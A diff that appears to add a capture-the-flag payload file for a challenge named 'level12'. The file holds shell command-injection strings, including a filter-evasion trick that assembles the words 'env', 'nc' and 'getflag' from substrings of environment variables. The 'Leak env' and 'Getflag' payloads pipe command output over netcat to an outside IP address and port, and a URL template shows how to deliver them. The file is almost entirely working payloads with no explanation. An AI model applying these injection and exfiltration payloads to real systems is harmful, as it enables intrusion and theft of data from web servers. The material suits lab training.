@@ -1,0 +1,34 @@
+PAYLOADS FOR INTENDED WAY
+>> Expected solution :
+./urlencode.sh '*"${IFS}/;DUMMY=2"'
+
+
+PAYLOADS FOR UNINTENDED WAY
+
+>> Env variable fuzzing
+$PATH=/usr/local/bin:/usr/bin:/bin
+$PWD=/var/www/level12
+
+>> Getting 'n'
+T=${PATH#/???/?????/??};N=${T%%:*}
+
+>> Getting 'c'
+S=${PATH#/???/??};C=${S%%??/*}
+
+>> Getting 'e'
+W=${PWD#/???/???/?};E=${W%%????2*}
+
+>> Getting 'v'
+Z=${PWD#/};V=${Z%%??/*}
+
+>> Getting 'getflag'
+U=${QUERY_STRING#??};GETFLAG=${U%%??=*}
+
+
+>> Leak env
+./urlencode.sh '*"$IFS/;T=${PATH#/???/?????/??};N=${T%%:*};S=${PATH#/???/??};C=${S%%??/*};W=${PWD#/???/???/?};E=${W%%????2};Z=${PWD#/};V=${Z%%??/*};${IFS}$E$N$V${IFS}|$N$C${IFS}192.168.1.5${IFS}1234;$IFSecho$IFS"'
+
+>> Getflag
+./urlencode.sh '*"$IFS/;T=${PATH#/???/?????/??};N=${T%%:*};S=${PATH#/???/??};C=${S%%??/*};U=${QUERY_STRING#??};GETFLAG=${U%%??=*};${IFS}$GETFLAG${IFS}|$N$C${IFS}192.168.1.5${IFS}1234;$IFSecho$IFS"'
+
+URL to use : http://192.168.1.16:4646/y?=getflag&x=[RESULT OF URLENCODE]
